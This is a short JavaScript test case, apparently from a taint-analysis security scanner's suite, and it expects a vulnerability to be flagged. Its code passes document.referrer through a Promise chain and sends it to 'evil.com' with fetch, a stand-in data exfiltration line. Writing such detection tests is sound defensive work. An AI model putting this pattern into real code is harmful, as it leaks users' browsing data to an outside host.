/**
 * Test: Promise chain with taint
 * Expected: VULNERABILITY - referrer through Promise chain to fetch
 */

function test() {
  Promise.resolve(document.referrer)
    .then(function(ref) {
      return 'leaked: ' + ref;
    })
    .then(function(data) {
      return fetch('https://evil.com?data=' + data);
    });
}

test();